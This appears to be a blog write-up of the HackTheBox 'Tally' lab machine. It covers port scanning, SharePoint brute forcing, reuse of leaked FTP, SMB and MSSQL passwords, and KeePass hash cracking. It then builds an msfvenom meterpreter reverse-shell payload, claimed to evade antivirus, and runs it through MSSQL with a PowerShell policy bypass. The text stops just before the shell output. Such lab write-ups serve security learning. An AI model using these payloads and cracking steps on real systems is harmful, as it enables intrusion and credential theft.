<ul>
<li><a href="#using-incognito-and-rottenpotato">Using Incognito and RottenPotato</a></li>
<li><a href="#using-cve-2017-213">Using CVE-2017-213</a></li>
</ul></li>
<li><a href="#what-about-exploiting-firefox">What about exploiting Firefox</a></li>
 
      
        <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
      </ul>
    </li>
   </ul>
  
   
  <ul class="nav nav-pills">
      <li><a class="p-logo" href="https://alamot.github.io/"><i class="fa fa-home" aria-hidden="true"></i> <span class="hidden768" lang="en">The Portal of Knowledge</span><span class="hidden768" lang="el">Η Πύλη της Γνώσης</span></a></li>
  </ul>
  
  <ul class="nav nav-pills pull-right topmargin7"> 
    <li id="lang-selector" role="presentation" class="dropdown">
      <a id="lang-index" class="dropdown-toggle btn-primary" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Language <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu">
        <li><a id="en" href="#">English</a></li>
        <li><a id="el" href="#">Ελληνικά</a></li>
      </ul>
    </li>  
  </ul>
</div>
</nav>
<script>
langtext = "English";
language = localStorage.getItem('language');
if (language) {
  document.getElementById('mainbody').setAttribute('class', language);
  document.getElementById('mainbody').setAttribute('lang', language);
  if (language == 'el') { langtext="Ελληνικά"; }
  document.getElementById("lang-index").innerHTML=langtext+' <i class="fa fa-caret-down" aria-hidden="true"></i>';
}
</script>




<div class="container-fluid">
  <div class="row">
    <div class="col-md-12">
      <article class="single centered">
        <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
        <div class="body">
            <header lang="en"><h1 id="title" class="title">Tally write-up</h1></header>
            <header lang="el"><h1 class="title">Ανάλυση του Tally</h1></header>
            <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
            <time lang="en" class="topmargin7">03 May 2018</time>
            <time lang="el" class="topmargin7">03 Μαϊ 2018</time>
            &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
            
              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
                <span lang="en">Cybersecurity</span>
                <span lang="el">Κυβερνοασφάλεια</span>
              </a>
            
            &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
                <span lang="en">hackthebox</span>
                <span lang="el">hackthebox</span>
                </a>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/windows'>
                <span lang="en">windows</span>
                <span lang="el">windows</span>
                </a>
            
         
         <aside>
          <section>
            <header lang="en"><h2>Contents</h2></header>
            <header lang="el"><h2>Περιεχόμενα</h2></header>
            <div><nav id="TableOfContents">
<ul>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
<li><a href="#brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</a></li>
<li><a href="#getting-ftp-credentials">Getting FTP credentials</a></li>
<li><a href="#getting-smb-credentials">Getting SMB credentials</a></li>
<li><a href="#getting-mssql-credentials">Getting MSSQL credentials</a></li>
<li><a href="#getting-shell">Getting shell</a></li>
</ul></li>
<li><a href="#privilege-escalation">Privilege Escalation</a>
<ul>
<li><a href="#using-incognito-and-rottenpotato">Using Incognito and RottenPotato</a></li>
<li><a href="#using-cve-2017-213">Using CVE-2017-213</a></li>
</ul></li>
<li><a href="#what-about-exploiting-firefox">What about exploiting Firefox</a></li>
</ul>
</nav></div>
          </section>
         </aside>
        
        

<h1 id="enumeration">Enumeration</h1>

<h2 id="port-scanning">Port scanning</h2>

<p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):</a>
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ./htbscan.py 10.10.10.59 <span class="m">300</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 300 --interactive 10.10.10.59
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-05-03 12:04:44 GMT
</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49668/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.59                                     
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 445/tcp on 10.10.10.59                                    
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32843/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49665/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 1433/tcp on 10.10.10.59                                   
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 135/tcp on 10.10.10.59                                    
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32844/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 81/tcp on 10.10.10.59                                     
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49667/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32846/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49666/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49666/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 47001/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 15567/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49664/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 139/tcp on 10.10.10.59                                    
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 49670/tcp on 10.10.10.59                                  
</span></span></span><span class="line"><span class="cl"><span class="go">                                                                             
</span></span></span><span class="line"><span class="cl"><span class="go">Running command: sudo nmap -A -p80,81,135,139,445,1433,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49670 10.10.10.59
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 15:11 EEST
</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.59
</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.12s latency).
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT      STATE SERVICE              VERSION
</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp    open  http                 Microsoft IIS httpd 10.0
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class="line"><span class="cl"><span class="go">81/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Bad Request
</span></span></span><span class="line"><span class="cl"><span class="go">135/tcp   open  msrpc                Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="go">139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
</span></span></span><span class="line"><span class="cl"><span class="go">445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
</span></span></span><span class="line"><span class="cl"><span class="go">1433/tcp  open  ms-sql-s             Microsoft SQL Server 2016 13.00.1601.00; RTM
</span></span></span><span class="line"><span class="cl"><span class="go">| ms-sql-ntlm-info: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   Target_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Domain_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Computer_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Domain_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Computer_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|_  Product_Version: 10.0.14393
</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2018-05-03T10:47:41
</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  2048-05-03T10:47:41
</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: 2018-05-03T12:12:35+00:00; +3s from scanner time.
</span></span></span><span class="line"><span class="cl"><span class="go">15567/tcp open  http                 Microsoft IIS httpd 10.0
</span></span></span><span class="line"><span class="cl"><span class="go">| http-auth: 
</span></span></span><span class="line"><span class="cl"><span class="go">| HTTP/1.1 401 Unauthorized\x0D
</span></span></span><span class="line"><span class="cl"><span class="go">|   Negotiate
</span></span></span><span class="line"><span class="cl"><span class="go">|_  NTLM
</span></span></span><span class="line"><span class="cl"><span class="go">| http-ntlm-info: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   Target_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Domain_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   NetBIOS_Computer_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Domain_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|   DNS_Computer_Name: TALLY
</span></span></span><span class="line"><span class="cl"><span class="go">|_  Product_Version: 10.0.14393
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Site doesn&#39;t have a title.
</span></span></span><span class="line"><span class="cl"><span class="go">32843/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Service Unavailable
</span></span></span><span class="line"><span class="cl"><span class="go">32844/tcp open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Service Unavailable
</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
</span></span></span><span class="line"><span class="cl"><span class="go">| Subject Alternative Name: DNS:localhost, DNS:tally
</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2017-09-17T22:51:16
</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  9999-01-01T00:00:00
</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: 2018-05-03T12:12:37+00:00; +3s from scanner time.
</span></span></span><span class="line"><span class="cl"><span class="go">| tls-alpn: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   h2
</span></span></span><span class="line"><span class="cl"><span class="go">|_  http/1.1
</span></span></span><span class="line"><span class="cl"><span class="go">32846/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
</span></span></span><span class="line"><span class="cl"><span class="go">47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Not Found
</span></span></span><span class="line"><span class="cl"><span class="go">49664/tcp open  msrpc                Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="go">49665/tcp open  msrpc                Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="go">49666/tcp open  msrpc                Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="go">49667/tcp open  msrpc                Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="go">49668/tcp open  msrpc                Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="go">49670/tcp open  msrpc                Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
</span></span></span><span class="line"><span class="cl"><span class="go">Network Distance: 2 hops
</span></span></span><span class="line"><span class="cl"><span class="go">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Host script results:
</span></span></span><span class="line"><span class="cl"><span class="go">|_clock-skew: mean: 2s, deviation: 0s, median: 2s
</span></span></span><span class="line"><span class="cl"><span class="go">| ms-sql-info: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   10.10.10.59:1433: 
</span></span></span><span class="line"><span class="cl"><span class="go">|     Version: 
</span></span></span><span class="line"><span class="cl"><span class="go">|       name: Microsoft SQL Server 2016 RTM
</span></span></span><span class="line"><span class="cl"><span class="go">|       number: 13.00.1601.00
</span></span></span><span class="line"><span class="cl"><span class="go">|       Product: Microsoft SQL Server 2016
</span></span></span><span class="line"><span class="cl"><span class="go">|       Service pack level: RTM
</span></span></span><span class="line"><span class="cl"><span class="go">|       Post-SP patches applied: false
</span></span></span><span class="line"><span class="cl"><span class="go">|_    TCP port: 1433
</span></span></span><span class="line"><span class="cl"><span class="go">| smb-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   account_used: guest
</span></span></span><span class="line"><span class="cl"><span class="go">|   authentication_level: user
</span></span></span><span class="line"><span class="cl"><span class="go">|   challenge_response: supported
</span></span></span><span class="line"><span class="cl"><span class="go">|_  message_signing: disabled (dangerous, but default)
</span></span></span><span class="line"><span class="cl"><span class="go">| smb2-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   2.02: 
</span></span></span><span class="line"><span class="cl"><span class="go">|_    Message signing enabled but not required
</span></span></span><span class="line"><span class="cl"><span class="go">| smb2-time: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   date: 2018-05-03 15:12:36
</span></span></span><span class="line"><span class="cl"><span class="go">|_  start_date: 2018-05-03 13:47:08
</span></span></span></code></pre></div></div></p>

<h2 id="brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</h2>

<p>We see that Microsoft SharePoint is on the box. Let&rsquo;s download the SharePointURLBrute tool from here:
<a href="https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/" target="_blank">https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/</a></p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> perl SharePointURLBrute<span class="se">\ </span>v1.1.pl  -a http://10.10.10.59 -e SharePoint-UrlExtensions-18Mar2012.txt
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting search for common SharePoint Pages
</span></span></span><span class="line"><span class="cl"><span class="go">Start Time: Sun Nov  5 11:37:15 2017
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">FOUND: http://10.10.10.59/_catalogs/masterpage/Forms/AllItems.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_catalogs/wp/Forms/AllItems.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/AreaNavigationSettings.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/AreaTemplateSettings.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/AreaWelcomePage.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/ChangeSiteMasterPage.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/MyInfo.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/MyPage.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/PageSettings.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/policy.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/policyconfig.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/policycts.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/Policylist.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/RedirectPage.aspx?Target={SiteCollectionUrl}_catalogs/masterpage
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/SiteDirectorySettings.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_layouts/sitemanager.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_Layouts/SiteManager.aspx?lro=all
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/alerts.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/dspsts.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/forms.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/Lists.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/people.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/Permissions.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/search.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/UserGroup.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/versions.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/Views.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/webpartpages.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/webs.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/SharepointEmailWS.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/spsearch.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/_vti_bin/WebPartPages.asmx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/default.aspx
</span></span></span><span class="line"><span class="cl"><span class="go">FOUND: http://10.10.10.59/shared documents/forms/allitems.aspx
</span></span></span></code></pre></div></div>

<h2 id="getting-ftp-credentials">Getting FTP credentials</h2>

<p>If we open the <a href="http://10.10.10.59/shared%20documents/forms/allitems.aspx" target="_blank">http://10.10.10.59/shared%20documents/forms/allitems.aspx</a>, we see a file named &ldquo;ftp-details&rdquo; modified by tally\administrator. Let&rsquo;s download it and see what there is inside:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">FTP details
</span></span><span class="line"><span class="cl">hostname: tally
</span></span><span class="line"><span class="cl">workgroup: htb.local
</span></span><span class="line"><span class="cl">password: UTDRSCH53c&#34;$6hys
</span></span><span class="line"><span class="cl">Please create your own user folder upon logging in</span></span></code></pre></div></p>

<p>Now, we know the FTP password but we lack the username. If we set a cookie named &ldquo;mobile&rdquo; equal to 1 (i.e. mobile=1) and reload the site, a gear appears at the top-right corner. We can click on that gear and select &ldquo;Site Contents&rdquo; and then &ldquo;Site Pages&rdquo;. There, we find an interesting link named &ldquo;FinanceTeam.aspx&rdquo; (again by tally\administrator). I originally found the gear by emulating a mobile device via my browser (using developer tools, google it if you don&rsquo;t know what I am talking about). When I reloaded the site, the gear appeared at the top-right corner.</p>

<p>Let&rsquo;s visit that link:</p>

<p><a href="http://10.10.10.59/_layouts/15/mobile/mblwikia.aspx?Url=%2FSitePages%2FFinanceTeam%2Easpx&amp;Source=%2F_layouts%2F15%2Fmobile%2Fviewa%2Easpx%3FList%3D076fa50e%252Dcea0%252D431a%252Dad18%252Dd528cf893d4c%26View%3Dee7b270d%252D91a9%252D482d%252Db7f2%252Df905c4b15281" target="_blank">http://10.10.10.59/_layouts/15/mobile/mblwikia.aspx?Url=%2FSitePages%2FFinanceTeam%2Easpx&amp;Source=%2F_layouts%2F15%2Fmobile%2Fviewa%2Easpx%3FList%3D076fa50e%252Dcea0%252D431a%252Dad18%252Dd528cf893d4c%26View%3Dee7b270d%252D91a9%252D482d%252Db7f2%252Df905c4b15281</a>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Migration update
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hi all,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to your new team page!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">As always, there&#39;s still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as &#39;index.html&#39; using the ftp_user account - I aim to review regularly.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We&#39;ll also add the fund and client account pages in due course.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thanks – Sarah &amp; Tim.</span></span></code></pre></div></p>

<p>Therefore our FTP credentials are ftp_user:UTDRSCH53c&rdquo;$6hys</p>

<h2 id="getting-smb-credentials">Getting SMB credentials</h2>

<p>Connect using FTP and have a look in /User/Tim/log/do to.txt
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">To do:
</span></span><span class="line"><span class="cl">Remove migration folder
</span></span><span class="line"><span class="cl">Set secure share permissions
</span></span><span class="line"><span class="cl">encrypted share creds:
</span></span><span class="line"><span class="cl">password in keepass</span></span></code></pre></div></p>

<p>Let&rsquo;s download /User/Tim/Files/tim.kdbx and crack it:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">keepass2john tim.kdbx &gt; hash
</span></span></span><span class="line"><span class="cl"><span class="go">john --format=KeePass --wordlist=/usr/share/dict/rockyou.txt hash
</span></span></span><span class="line"><span class="cl"><span class="go">tim:simplementeyo
</span></span></span></code></pre></div></div></p>

<p>Now open tim.kbdx using keepass (Master password: simplementeyo)
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> keepass tim.kbdx
</span></span></code></pre></div></div></p>

<p>Go to Database -&gt; WORK -&gt; WINDOWS -&gt; Shares. Here, we found some SMB credentials Finance:Acc0unting (right click and copy password to get the password)</p>

<h2 id="getting-mssql-credentials">Getting MSSQL credentials</h2>

<p>Let&rsquo;s connect to SMB:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> smbclient -U Finance <span class="se">\\\\</span>10.10.10.59<span class="se">\\</span>ACCT
</span></span></code></pre></div></div>
or
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo mount -t cifs //10.10.10.59/ACCT /mnt/TEMP -o,user<span class="o">=</span>Finance,password<span class="o">=</span>Acc0unting,vers<span class="o">=</span>2.0
</span></span></code></pre></div></div></p>

<p>Inside the smb:\zz_Migration\Binaries\new Folder\tester.exe we find this:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</span></span></code></pre></div></p>

<p>This means our MSSQL credentials are sa:GWE3V65#6KFH93@4GWTG2G</p>

<h2 id="getting-shell">Getting shell</h2>

<p>Let&rsquo;s make a meterpreter payload using msfvenom. If we use the <strong>psh-reflection</strong> format our payload invade the antivirus detection:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.105 <span class="nv">LPORT</span><span class="o">=</span><span class="m">60000</span> -f psh-reflection -o msf.ps1
</span></span></code></pre></div></div></p>

<p>Don&rsquo;t forget to set up your listener using exploit/multi/handler:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf&gt; use exploit/multi/handler
</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; options
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Module options (exploit/multi/handler):
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Payload options (windows/x64/meterpreter/reverse_tcp):
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   Name      Current Setting  Required  Description
</span></span></span><span class="line"><span class="cl"><span class="go">   ----      ---------------  --------  -----------
</span></span></span><span class="line"><span class="cl"><span class="go">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
</span></span></span><span class="line"><span class="cl"><span class="go">   LHOST     10.10.14.105     yes       The listen address
</span></span></span><span class="line"><span class="cl"><span class="go">   LPORT     60000            yes       The listen port
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">msf exploit(handler) &gt; exploit
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Started reverse TCP handler on 127.0.0.1:6000
</span></span></span></code></pre></div></div></p>

<p>Now, upload msf.ps1 to /Intranet via FTP. We can execute our payload via MSSQL:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfconsole
</span></span><span class="line"><span class="cl"><span class="go">msf&gt; use  auxiliary/admin/mssql/mssql_exec
</span></span></span><span class="line"><span class="cl"><span class="go">msf auxiliary(mssql_exec) &gt; set CMD &#34;powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\Intranet\\msf.ps1&#34;
</span></span></span><span class="line"><span class="cl"><span class="go">msf auxiliary(mssql_exec) &gt; info
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Basic options:
</span></span></span><span class="line"><span class="cl"><span class="go">  Name             Current Setting
</span></span></span><span class="line"><span class="cl"><span class="go">  ----             ---------------
</span></span></span><span class="line"><span class="cl"><span class="go">  CMD              powershell -ExecutionPolicy bypass -NoExit -File C:\FTP\Intranet\msf.ps1
</span></span></span><span class="line"><span class="cl"><span class="go">  PASSWORD         GWE3V65#6KFH93@4GWTG2G
</span></span></span><span class="line"><span class="cl"><span class="go">  RHOST            10.10.10.59
</span></span></span><span class="line"><span class="cl"><span class="go">  RPORT            1433
</span></span></span><span class="line"><span class="cl"><span class="go">  TDSENCRYPTION    false
</span></span></span><span class="line"><span class="cl"><span class="go">  USERNAME         sa
</span></span></span><span class="line"><span class="cl"><span class="go">  USE_WINDOWS_AUTH false
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">msf auxiliary(mssql_exec) &gt; exploit
</span></span></span></code></pre></div></div></p>

<p>And here is our meterpreter shell:
